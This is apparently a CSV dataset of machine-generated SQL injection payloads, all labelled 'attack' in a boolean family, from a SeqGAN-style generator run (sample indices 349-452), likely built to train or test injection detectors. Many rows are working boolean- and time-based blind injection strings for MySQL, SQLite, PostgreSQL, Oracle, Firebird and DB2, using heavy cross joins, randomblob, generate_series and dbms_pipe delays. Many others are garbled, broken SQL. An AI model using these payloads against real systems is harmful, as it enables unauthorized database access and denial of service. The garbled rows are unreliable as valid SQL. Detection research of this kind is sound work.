label,payload,family,payload_type,method,run_id,sample_index
attack,"1'+  (  select ')xg""   )    )     =     (    (   ""vlpe.s 8407  (  select from e  (  select or ||2494  =  1 or 7417  =    (4906  79  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,349
attack,"1""  )   akesqs t5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,350
attack,"1  ,d  (  90  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,351
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,352
attack,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ''  =  'jd%'  =  '' like '11x.   )  ,0  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,353
attack,"select cdn  (  select like  (    =  6975  (  'abcdefg',_  (  *  1,5000000   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,354
attack,"1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,355
attack,"1%"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""a'  =  'j_lll_users gaupge   (  *  )   or ""  =  ""  =  *sas t2,rdb$col_ususetmas as t2,domaid  (  1,5000000   ables  (  char  (  r(  charr  (  ""  )  )   (  "" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and "" else rdb$fins age7240 2072  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,356
attack,"1 5903  =    (  select coluns t2,domaindes msysagip_suspstsyskbls ssubm.s 8060qs t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,357
attack,1  )   asibmns as cdej,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,358
attack,"1  )   and 3707  =  'g"" like "",as",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,359
attack,"1""  )   where 7046  =  like  (  *  (  select casey  )   or 4123  =  67  )   from 2633  (  109  )   from i   (  8459  =  6790 +  )   and    (     select count  (  69  )   and null  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,360
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,361
attack,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,362
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zn",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,363
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,364
attack,"1' in boolean mode  )   or 8384  =  like  (  'azabrrdb$fieom.acoetat  (  500000000/2  )   from mbl(ipe_messgws as t3,rdb$t  (    deps t  (  3702  )   from 8363 2072  =  7046 5606  =  9169,0  (  select case 5903  =  2494 or 1,5000000   )    )   -- and   (  116  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,365
attack,"1%'  )   and 3202  =  like  (  'ablobob  (      (  1,apes rdb$ypos_stsysg",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,366
attack,"1%' or 8156  =    (  select countce  (  select rd  ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,367
attack,"1%ar'  =  'ble_users as g  =  90  )   and   (  3020  =  1 from bles ab s as rdomas at  (  select counp  (  *  d   from ""jkfk""  (  )   '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,368
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,369
attack,1%--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,370
attack,-3953  )   where 3455  =  1976  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,371
attack,"select ""jkfk""  =  8459  )   from 5556  =    (    (     (  select count  (  *  s and 8189  =  5606 and 1022  =    (  select 3902  =  1 or daus el_4906--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,372
attack,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  'jj",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,373
attack,"1%'  )   and 3202  =  like  (  'abcolup_messagexpp_sususers t1,sysibm.sysustables ds abb  s as rdb$' from dual where 5309  =  5309 and 3202  =  like  (  'agiver(  *   (    (     (  3020  =  1 orb$    (  1 from rdbltage_us  (  'ootz' u'qt  (  rrdb$collus as ustes as t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,374
attack,"1""  )   adbverans domains as t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,375
attack,1'   )    )      )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,376
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,377
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,378
attack,"""   )    )    or    (    (   ""x  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,379
attack,"1'   )    )      )    )   and 9687  =  1 or 7417  =  1 -- '   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ' and   (  *  )   where from al_users g5000000   )    )      )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,380
attack,select 3020  )   from 3018  (  8459  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,381
attack,"-3596   ib$c'  =  'a'  =  'ifivatelcoveaite_mes a)sers t1,all_users domains astables apre_eceive_sers t1,blomelds akee.s cnoteas as t3  )   and    (    (     (  charage.  ,5127  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,382
attack,"1 where 2367  =  1 or ""  (  @"" or 8189  )   and 8189  =    (  3645  1  )   and    (  select cont  (  *  )   and    (   ""vfvh""  =  2223 or 7078  =  8459  )  1,aie_messas t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,383
attack,"1""   )    )      )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,384
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%5000000   '""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,385
attack,"1"" and 8189  =    (  select coumt  (  cht  (  8459  (  r",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,386
attack,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hwhered4212 or 9643  =  1 or 6979  =  m%  (  1,andbms agex  (  select case 5903  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,387
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,388
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,389
attack,"1%'   )    )    )    alsagipeceives(    ,rall_us  (  500000000/2   )   and   (  /abeper  (  hex  ans s astbles as gvius urtas rdom.sysiblssibm.sysibmsms_basssg.tables as cde112  (  *  )   anob  (  select colug",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,390
attack,1%a'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'ivjin' like 'ps,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,391
attack,1'   )    )   #,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,392
attack,"select cele  (  select   (  *  )   and    (   7240  (  'abcdefg',uppes crdble(     (  select count  (  9354  =  dbmbceie_ms_pes sysibs agex  )  ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,393
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,394
attack,"1%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""s'  =  'sysbkll_usupeserateisagtiegeipe.ressage  (  char  (  5019  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,395
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,396
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  ' ||y  ||count  )   and    (  select count  (  90  )   from db$colusypeas as domallds as ustaive.sersibs as us mns t5  )   from rdbge  (  select coun  (  8459  )  ,5  )   or 2367  =  ,500000000,sesyps where 1183  =  like  (  r",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,397
attack,select 3175  =  3018 or 1022  =    (  select count  (  *  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,398
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvbmapjin' like 'pwjg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'     )   and    (  select like  (  8459  =  8482 or 5333  =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,399
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,400
attack,"1%""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'   zhwfromysibm.sysistables s_blob  (  500000000  s   ypipst(_',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'ripp_ppp_pessumsbm.sypp_sps as t4  (  select case or 5903 else else 0 5903  =  '%'  =  8100 and 8189  (  '%'  112  )  ,null  )   and    (m500000000/1 or 0  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,401
attack,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,402
attack,"1""  )   akeperesaries_useras b$funqs t3  ||chr  (  'xcnj'  )  -- 2  ,5  )   and   (    (8459  )   and 8148  =  ' where 2494  =  2332 or case -- 1 else then then 1 5903 else then 9643  =  $x  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,403
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  ""g',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'dk"" like ""'vcgc'tbstables s as rdbles t2,3056  (  rdb$collagu""  )   or   (  1436  =  4186  )  *4186 and   (  ""s as domaingeraustables 8189suppt  (  crdes ell_users t4,adbles as alepeceivs_(    s ell_us es rles us    (s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,404
attack,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,405
attack,"1"" where 5019  =  ablesers t3,el_uses and    sers sysibm.systables as meldbles iesat  (    ""gzhp""  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,406
attack,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'ndbmsibmsyssibm.sypsecelususumaldsuns tystableskables age  ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,407
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,408
attack,"1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'ywbmqitypinvfg5q) where dmbcel_xers sysibm.sys as t1,syssibm.systableges  (  select countas as t4  (  'abcdefg',upes 9687  (  ""ymss""  =  2678  =  ""x,l_users ibs as t3  (  *  'abcdefg',    (   ""sfnj"" 'qzvzq'  )   and   (  'qomf' from rdboms",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,409
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,410
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,411
attack,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,412
attack,"1""   )    )      )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,413
attack,"select 5019  (  'abcdefg'  )   and   (  select  (  rfrom rdb$fies as t1,rdb$database  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,414
attack,"1%'  )   and 3202  =  like  (  'ables es ns msibms_pip_s  spiblibm.s   as t3,all_users s t2,all_users galldbles as (  ri",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,415
attack,"1%'   )   asypp_pppstrables ele_me_meas ms as t2,s as sysibms_pipipe.rs s_sibm.sypessables ge dspri  (  4062s   ables ms asisipipecrdbles 9660  (  randomsysibm.selectsibm.systablus_",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,416
attack,"select colurdbs as ts ans t3,ains iom.s as t1,s as t3  )   and 5556  =    (  select 1  =  -- where like  =  -- 'pnst'  )   or 9660  =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,417
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,418
attack,"1""  )   and 8189  =    (  select cont  (  *  )   and   (    (    (         )    )   or 9687  (  65  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,419
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,420
attack,"1%""   )    )      )    )      )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,421
attack,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,422
attack,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'll$iotabs as t3  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,423
attack,"1%""ye)   asers gh",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,424
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,425
attack,"1  )   )    )   or 'osqf'  =  7046 8189  =    (  select cont  (  hex  (  1  )  ,5  )   7240  ||chr(  79  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,426
attack,"1' in boolean mode  )   or 8384  =  like  (  'as s""  =  ""oz",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,427
attack,"1'   )   from ables ssibm.ssagtysies m.sysib  )  *s""  =  ""sibmsibmessagexsagut  (  crdbldbesers as t3  (  *  )   or 3455 g",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,428
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""rdnbomabcdefg5672xm9354",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,429
attack,"1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,430
attack,"1""  )   or 1022  =  *6703--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,431
attack,"1  r)   -- * or    (  'vcgc' 5  (  *  ras t  (  3020  =  1 or 8060  (  r  (  hr(  =  like    (  9354  =  like  (  'abcdefg',u  (  char  (  *  )   andeas as b  (  (  3702  )   as  (  1",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,432
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,433
attack,"1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,434
attack,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""lblds as all_urs as t3  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,435
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,436
attack,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,437
attack,"1""   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,438
attack,"1  )   and    )'  =  '  (  select countes and    (  500000000  )   from * r  ,0  )   from all_us eral_users as cins     all_users all_users all_users tables as t3  (  chryppe  (  select r  (  *  )   from all_users t5  )   from rdb$fie",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,439
attack,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eratabeses t3  )   from ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,440
attack,"1""   )    )    as rsysibm.stables as t2,sysibms_pipe.s  s coll_usumail_usyses  (  109  )   or 8635  =    (  select rdbles as t3  (  *  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,441
attack,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,442
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,443
attack,1  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,444
attack,"1'   )    )      )   and ""jkfk""  =  1 and    (  3020fgtines s as t3  )   from domains t2,aldb$comas  (  select as coustables agexs  (  3645  )   or 5903  =  1 or 6537  =  ,9432  )   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,445
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,446
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,447
attack,"1   )    )    and    )    andnull  ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,448
attack,"1%'  )   and 3202  =  like  (  'alle_paes rs as aries sysibms mbs_s_sers ibms as domain.domains as t1,sysibm.sysims sagat 8407  =  6433 or 'qjle'  =  like  (  'abcdefg',u  (  select and   (  8459  =  1 or 9687  =  like  (  rier  (  3020  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,449
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,450
attack,"1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,451
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,452
